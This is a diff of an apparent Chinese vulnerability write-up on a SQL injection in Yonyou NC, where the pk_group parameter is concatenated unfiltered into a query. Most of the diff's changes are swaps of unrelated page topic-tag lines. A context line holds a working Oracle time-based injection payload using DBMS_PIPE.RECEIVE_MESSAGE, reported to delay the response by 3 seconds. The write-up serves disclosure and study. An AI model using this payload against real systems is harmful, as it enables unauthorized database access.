@@ -38,11 +38,11 @@ public Object doQuerySubPurchaseOrgByParentPk(HttpServletRequest request, HttpSe
 
 深入探索
 
-网络安全
+企业技术
 
-计算机安全
+客户关系管理
 
-搜索引擎优化与营销
+软件
 
 用户可控参数 `pk_group` 未经任何处理或校验过滤就直接带入 `queryRegisterOrgsFilterByName` 方法
 
@@ -76,6 +76,14 @@ public Map<String, RegisterOrgVO> queryRegisterOrgs(String pk_group) throws Busi
                 vos = (RegisterOrgVO[])query.query(sql.toString(), (String)null);
 ```
 
+深入探索
+
+编程
+
+客户关系管理
+
+企业技术
+
 很明显的直接将参数拼接进sql语句中，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。
 
 而权限校验部分可以参考 [用友NC pkevalset SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-evalschedule-pkevalset-sqli.html) 部分
@@ -96,4 +104,4 @@ pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',3)--
 
 成功延时 3 秒
 
-计算机安全
+数据管理
